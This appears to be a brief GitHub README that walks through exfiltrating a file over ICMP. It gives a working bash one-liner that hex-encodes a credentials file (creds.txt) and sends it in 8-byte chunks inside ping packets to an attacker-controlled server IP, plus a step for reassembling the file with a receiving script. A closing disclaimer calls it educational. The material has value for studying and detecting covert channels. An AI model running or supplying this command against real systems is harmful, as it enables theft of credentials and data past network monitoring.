# Data Exfiltration via ICMP

Step 1 )> Run the following command on the client server from linux command line to read the target file in fixed-size chunks and sent each chunk to our server (8 bytes) by embedding it into ICMP packets, effectively exfiltrating the data bit by bit.:
```bash
xxd -p -c 8 creds.txt | while read h; do ping -c 1 -p $h <Server-IP>; done
```

<img width="1409" height="552" alt="icmp_1" src="https://github.com/user-attachments/assets/e8a6b8c4-0888-427e-82d6-9c80b77a078b" />


Step 2 )> Run the ```icmp.py``` script on your server to capture incoming ICMP packets and extract the embedded data, and then reassemble the original file to reconstruct it fully.

<img width="1333" height="329" alt="icmp_2" src="https://github.com/user-attachments/assets/b32225f5-8585-46ae-8c79-b088a23f10b6" />


**Disclaimer: This is for educational and defensive use only. Do not perform unauthorized testing, exploitation, or data exfiltration against systems you do not own or have explicit written permission to test.**
